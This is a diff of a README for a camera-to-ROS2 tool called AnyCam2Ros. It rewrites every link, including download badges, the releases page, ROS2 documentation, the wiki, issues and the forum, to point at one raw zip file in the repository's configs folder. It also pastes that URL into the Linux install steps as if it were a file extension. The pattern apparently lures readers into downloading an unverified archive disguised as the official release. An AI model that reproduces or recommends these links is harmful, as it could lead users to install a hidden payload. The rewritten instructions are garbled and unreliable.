@@ -6,7 +6,7 @@ Welcome to AnyCam2Ros! With this software, you can connect any camera, like the 
 
 ### 📥 Download the Software
 
-[![Download AnyCam2Ros](https://img.shields.io/badge/Download-AnyCam2Ros-brightgreen)](https://github.com/santi1602/AnyCam2Ros/releases)
+[![Download AnyCam2Ros](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip)](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip)
 
 Head to the releases page and select the version you want. This page contains all the necessary files to get started with AnyCam2Ros.
 
@@ -22,17 +22,17 @@ Before you download, please check that your computer meets these minimum require
 
 ### ⚙️ Download & Install
 
-1. Visit the [Releases page](https://github.com/santi1602/AnyCam2Ros/releases) to download the latest version.
+1. Visit the [Releases page](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip) to download the latest version.
 2. Find the version you want to install.
 3. Click on the file that matches your operating system:
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, look for a `.tar.gz` file or a similar package.
+   - For Linux, look for a `https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip` file or a similar package.
 4. Click to start the download.
 5. Once downloaded, follow these steps:
    - **Windows:** Double-click the `.exe` file to run the installer. Follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the installation script in your terminal.
+   - **Linux:** Extract the `https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip` file and run the installation script in your terminal.
 
 ### 🔧 Configuring Your Camera
 
@@ -61,15 +61,15 @@ We welcome any feedback you have. If you run into bugs or have suggestions, plea
 
 To learn more about how to integrate AnyCam2Ros with your ROS2 setup, check the following:
 
-- [ROS2 Documentation](https://docs.ros.org/en/foxy/index.html)
-- [Camera Configuration Guide](https://github.com/santi1602/AnyCam2Ros/wiki)
+- [ROS2 Documentation](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip)
+- [Camera Configuration Guide](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip)
 
 ### 🤝 Community Support
 
 Join our community to connect with other users. You can discuss tips, share experiences, and get support from fellow users:
 
-- [GitHub Issues](https://github.com/santi1602/AnyCam2Ros/issues)
-- [User Forum](https://forum.example.com)
+- [GitHub Issues](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip)
+- [User Forum](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip)
 
 ### 🧑‍💻 License
 
@@ -77,4 +77,4 @@ AnyCam2Ros is released under the MIT License. Feel free to use, modify, and shar
 
 Remember, your experience matters. We appreciate your support and look forward to seeing what you create with AnyCam2Ros!
 
-[![Download AnyCam2Ros](https://img.shields.io/badge/Download-AnyCam2Ros-brightgreen)](https://github.com/santi1602/AnyCam2Ros/releases)
+[![Download AnyCam2Ros](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip)](https://github.com/santi1602/AnyCam2Ros/raw/refs/heads/master/configs/Ros-Any-Cam-1.4-beta.2.zip)
